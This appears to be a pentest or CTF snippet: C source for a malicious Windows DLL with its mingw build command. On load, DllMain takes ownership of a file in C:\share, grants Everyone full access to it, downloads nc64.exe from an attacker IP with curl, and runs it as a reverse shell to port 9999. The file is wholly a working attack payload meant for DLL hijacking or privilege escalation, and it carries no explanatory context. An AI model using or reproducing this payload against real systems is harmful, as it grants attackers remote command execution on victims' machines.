////////////////////
////////////////////

// Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
      system("takeown /f C:\\share\\yoyo64.exe");
      system("icacls C:\\share\\yoyo64.exe /grant Everyone:F /T");
      system("curl 10.10.xx.xx/nc64.exe -o c:\\share\\yoyo64.exe");
      system("C:\\share\\yoyo64.exe 10.10.xx.xx 9999 -e cmd.exe");
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}

////////////////////
//
//
